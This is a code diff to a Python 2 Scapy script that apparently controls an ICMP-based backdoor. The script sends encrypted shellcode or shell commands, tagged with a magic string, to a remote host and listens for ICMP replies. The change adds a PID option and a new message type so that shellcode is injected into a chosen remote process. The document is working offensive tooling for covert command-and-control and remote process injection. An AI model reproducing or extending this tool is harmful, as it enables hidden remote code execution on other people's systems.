@@ -6,22 +6,24 @@ import getopt
 ########## functions ############
 def usage():
    print "Usage:"
-   print "\tpython %s -i <iface> -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-h]" % sys.argv[0]
+   print "\tpython %s -i <iface> -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-p <pid>] [-h]" % sys.argv[0]
    print "\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)"
    print "\t\tiface: interface to send from and listen on (Default: eth0)"
    print "\t\tsrc_ip: the address we want to send from (Can be anything)"
    print "\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin"
+   print "\t\tpid: inject the given shellcode into the remote process with this PID"
    print
    sys.exit(0)
 
 def parse_args():
-   global iface, dst_ip, src_ip, shellcode_file
+   global iface, dst_ip, src_ip, shellcode_file, pid
 
    try:
-      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
-         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])
+      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:p:h', \
+         ['interface=', 'destination=', 'source=', 'shellcode=', 'pid=', 'help'])
 
    except getopt.GetoptError, err:
+      print err
       usage()    
 
    for o, a in opts:
@@ -33,6 +35,8 @@ def parse_args():
          src_ip = a
       if o in ('-f', '--shellcode'):
          shellcode_file = a
+      if o in ('-p', '--pid'):
+         pid = int(a)
       if o in ('-h', '--help'):
          usage()
 
@@ -80,15 +84,20 @@ def start_listener(iface, *args):
    sniff(filter="icmp", iface=iface, prn=sniff_packet)
 
 def send_shellcode():
-   global MSG_TYPE_SHELLCODE, magic, iface, shellcode_file
+   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, iface, shellcode_file, pid
    shellcode = ''
 
+   if pid != 0:
+      shellcode = magic + MSG_TYPE_REMOTE_SHELLCODE + struct.pack('<H', pid)
+   else:
+      shellcode = magic + MSG_TYPE_SHELLCODE
+      
    # Open and read the shellcode
    if shellcode_file == '-':
-      shellcode = magic + MSG_TYPE_SHELLCODE + sys.stdin.read()
+      shellcode += sys.stdin.read()
    else:
       f = open(shellcode_file, 'r')
-      shellcode = magic + MSG_TYPE_SHELLCODE + f.read()
+      shellcode += f.read()
       f.close()
 
    # Get the required crypto bits
@@ -102,12 +111,14 @@ def send_shellcode():
 ########### main #############
 MSG_TYPE_SHELLCODE = '\x01'
 MSG_TYPE_COMMAND = '\x02'
+MSG_TYPE_REMOTE_SHELLCODE = '\x03'
 
 magic = "GOATSE"
 iface = "eth0"
 src_ip = ""
 dst_ip = ""
 shellcode_file = ""
+pid = 0
 
 # We need use rand for key generation
 random.seed()
@@ -119,7 +130,14 @@ parse_args()
 if dst_ip == "":
    print "ERROR: Destination must be specified"
    usage()
-
+   sys.exit(0)
+   
+# shellcode is required with a pid
+if pid != 0 and shellcode_file == "":
+   print "ERROR: You must specify the shellcode to send if specifying a pid"
+   usage()
+   sys.exit(0)
+ 
 # Do we send shellcode or start a shell
 if shellcode_file != "":
 	send_shellcode()
